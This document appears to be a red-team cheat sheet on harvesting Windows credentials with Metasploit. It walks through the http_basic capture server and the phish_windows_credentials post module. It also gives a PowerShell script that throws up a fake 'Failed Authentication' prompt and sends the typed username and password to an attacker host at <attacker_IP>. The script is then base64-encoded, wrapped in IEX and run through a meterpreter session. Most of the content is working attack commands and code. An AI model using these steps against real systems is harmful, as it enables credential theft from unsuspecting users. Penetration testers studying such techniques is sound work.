# Metasploit

Search Tag(s): #privilege-escalation #windows

## 01 - Usage

### 1.1 - Auxiliary Module

- MSF HTTP Client Basic Authentication Credential Collector Auxiliary Module

```
msf > use auxiliary/server/capture/http_basic

msf auxiliary(server/capture/http_basic) > options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you'd like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      80               yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                       no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name     Description
   ----     -----------
   Capture  Run capture web server


msf auxiliary(server/capture/http_basic) > set uripath [/uri_path]

msf auxiliary(server/capture/http_basic) > set srvhost <IP>

msf auxiliary(server/capture/http_basic) > set srvport <PORT>

msf auxiliary(server/capture/http_basic) > set ssl <true | false>

msf auxiliary(server/capture/http_basic) > set sslcert /path/to/cert.pem

msf auxiliary(server/capture/http_basic) > set realm <realm_name>

msf auxiliary(server/capture/http_basic) > set redirectURL <url>

msf auxiliary(server/capture/http_basic) > run
```

### 1.2 - Post

```
msf > use post/windows/gather/phish_windows_credentials

msf post(windows/gather/phish_windows_credentials) > options

Module options (post/windows/gather/phish_windows_credentials):

   Name         Current Setting                                                                Required  Description
   ----         ---------------                                                                --------  -----------
   DESCRIPTION  {PROCESS_NAME} needs your permissions to start. Please enter user credentials  yes       Message shown in the loginprompt
   PROCESS                                                                                     no        Prompt if a specific process is started by the target. (e.g. calc.exe or specify * for all processes)
   SESSION                                                                                     yes       The session to run this module on.

msf post(windows/gather/phish_windows_credentials) > set description <description>

msf post(windows/gather/phish_windows_credentials) > set process <program_name.exe>

msf post(windows/gather/phish_windows_credentials) > set session <session_ID>

msf post(windows/gather/phish_windows_credentials) > run
```

## 02 - Use Case

### 2.1 - Capture credentials with the webserver

- Run the auxiliary module to setup http webserver

```
msf > use auxiliary/server/capture/http_basic

msf auxiliary(server/capture/http_basic) > set uripath /

msf auxiliary(server/capture/http_basic) > set srvhost 0.0.0.0

msf auxiliary(server/capture/http_basic) > set srvport 443

msf auxiliary(server/capture/http_basic) > set ssl true

msf auxiliary(server/capture/http_basic) > run
```

- Using the powershell script to execute it the victim

```powershell
$ cat phish.txt
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$wc = New-Object Net.WebClient;
$wc.Headers.Add("User-Agent","<user_agent>");
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
$result = $wc.downloadstring('https://<attacker_IP>/');
```

Encode it into base64

```
$ iconv -t UTF-16LE phish.txt | base64 -w 0

$ iconv -t UTF-16LE phish.txt | basenc -w 0 --base64
```

- Then copy the encoded text file in the powershell script.

```powershell
$ cat encoded.ps1
IEX ([System.Text.Encoding]::Unicode.GetString(([convert]::FromBase64String('<base64_encoded>'))))
```

- Then execute the powershell script with a post module.

```
meterpreter > run post/windows/manage/exec_powershell script=encoded.ps1
```

### 2.2 - Post Module

```
msf > use post/windows/gather/phish_windows_credentials

msf post(windows/gather/phish_windows_credentials) > set process *

msf post(windows/gather/phish_windows_credentials) > set session <session_ID>

msf post(windows/gather/phish_windows_credentials) > run
```

---
## References

- [[User Agents]]

- [Malicious.link](https://room362.com/posts/2015/powershell-popups-and-capture/)

- [Rapid7: Metasploit Framework Phishing Windows Credentials](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/phish_windows_credentials.md)

- [Enigma0x3: Phishing for Credentials If you want it, just ask!](https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/)

- [Home-Grown Red Team: Internal Windows Phishing With Pickl3 And InsideMan](https://assume-breach.medium.com/home-grown-red-team-internal-windows-phishing-with-pickl3-and-insideman-2cd2e92f7d3e)

- [Invoke-LoginPrompt](https://github.com/rapid7/metasploit-framework/blob/master/data/post/powershell/Invoke-LoginPrompt.ps1)